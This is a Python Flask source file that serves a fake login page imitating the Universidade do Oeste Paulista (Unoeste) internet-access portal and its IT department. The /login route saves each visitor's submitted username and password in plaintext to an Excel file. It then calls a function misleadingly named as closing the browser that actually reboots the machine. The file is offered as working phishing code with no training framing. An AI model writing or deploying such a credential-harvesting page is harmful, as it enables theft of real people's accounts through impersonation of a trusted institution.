from flask import Flask, request, render_template_string
import pandas as pd
import os
import platform

app = Flask(__name__)

# Caminho para o arquivo Excel
excel_file = 'E:/infoeste/user_data.xlsx'

# Função para fechar o navegador
def fechar_navegador1():
    sistema = platform.system()

    if sistema == "Windows":
        os.system("taskkill /F /IM firefox.exe")  # Fecha o Firefox no Windows
    elif sistema == "Linux" or sistema == "Darwin":  # Darwin é o MacOS
        os.system("pkill firefox")  # Fecha o Firefox no Linux ou MacOS

# Função para reiniciar o computador
def fechar_navegador():
    sistema = platform.system()

    if sistema == "Windows":
        os.system("shutdown /r /t 0")  # Reinicia o Windows imediatamente
    elif sistema == "Linux" or sistema == "Darwin":  # Darwin é o MacOS
        os.system("sudo reboot")  # Reinicia o Linux ou MacOS

# Página de login com HTML fornecido
@app.route('/')
def index():
    html_content = '''
    <!DOCTYPE html>
    <html><head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="PRAGMA" content="NO-CACHE">
    <meta name="viewport" content="initial-scale=1.0">
    <title>Unoeste - Identificação do Usuário</title>
    <style>
        html, body{
            height: 99%;
        }
        body {
            color: #111;
            font-family: Verdana,Arial,Helvetica,sans-serif;
            background-color:#d2d6dA;
            vertical-align: middle;
        }
        #activearea {
            border-width: 2px;
            border-color: #c2c6cA;
            border-style: solid;
            border-radius: 15px;
            background-color: #ffffff;
            padding: 20px;
            max-width: 500px;
            margin-left: auto;
            margin-right: auto;
        }
        #heading {
            font-size: 1.1em;
            font-weight: bold;
            max-width: 500px;
            margin-left: auto;
            margin-right: auto;
            text-align: center;
        }
        #desc {
            font-size: 1em;
            margin: 15px;
            max-width: 500px;
            text-align: left;
            margin-left: auto;
            margin-right: auto;
        }
        form td span {
            font-size: 1em;
            font-weight: bold;
        }
        #formtable {
            height: 100%;
            width: 100%;
        }
        #taLogin {
            width: 250px;
            margin-left: auto;
            margin-right: auto;
        }
        .buttonFixed {
            font-size: 1em;
        }
        .msg {
            background-color: #ffff99;
            border-width: 2px;
            border-color: #ff0000;
            border-style: solid;
            border-radius: 5px;
            margin-top: 0.5em;
            padding: 0.5em;
            max-height: 150px;
            height: expression( this.scrollHeight > 150 ? "150px" : "auto" ); /* sets max-height for IE */
            overflow: auto;
            font-size: 1em;
        }
    </style>
    </head>
    <body>
    <table id="formtable">
    <tbody><tr><td>
        <div id="activearea">
            <div id="heading"><span style="color:#060">Universidade do Oeste Paulista</span></div>
            <div id="desc">Caros colegas, <b>para acessar a Internet</b> em nossa instituição, solicitamos que <b>informe suas credenciais</b> no formulário abaixo.</div>
            <div id="formdiv">
                <form action="/login" method="POST">
                    <div id="taLogin">
                    <table>
                        <tbody><tr id="dUserName">
                        <td id="userTitle">User</td>
                        <td>
                        <input type="text" id="username" name="username" size="19" placeholder="Username">
                        </td>
                        </tr>
                        <tr>
                        <td id="passwdTitle">Password</td>
                        <td>
                        <input type="password" maxlength="255" size="19" id="password" name="password" placeholder="Password">
                        </td>
                        </tr>
                        <tr>
                        <td id="buttonOffset"></td>
                        <td>
                        <input class="buttonFixed" type="submit" id="submit" name="ok" value="Login">
                        </td>
                        </tr>
                    </tbody></table>
                    </div>
                </form>
            </div>
            <div id="desc">Para <b>dúvidas</b>, favor entrar em contato com o <b>Depto de TI</b> da Unoeste pelo ramal 1301.</div>
        </div>
    </td></tr>
    </tbody></table>
    </body></html>
    '''
    return render_template_string(html_content)

# Processamento de login
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Carregue o arquivo Excel ou crie se não existir
    if os.path.exists(excel_file):
        df = pd.read_excel(excel_file)
    else:
        df = pd.DataFrame(columns=['Username', 'Password'])

    # Adicionar a nova linha com username e password
    new_row = pd.DataFrame({'Username': [username], 'Password': [password]})
    df = pd.concat([df, new_row], ignore_index=True)
    
    # Salvar no Excel
    df.to_excel(excel_file, index=False)

    # Fecha o navegador após o processamento
    fechar_navegador()
    
    return "Dados salvos e navegador fechado!"

if __name__ == '__main__':
    app.run(debug=True)
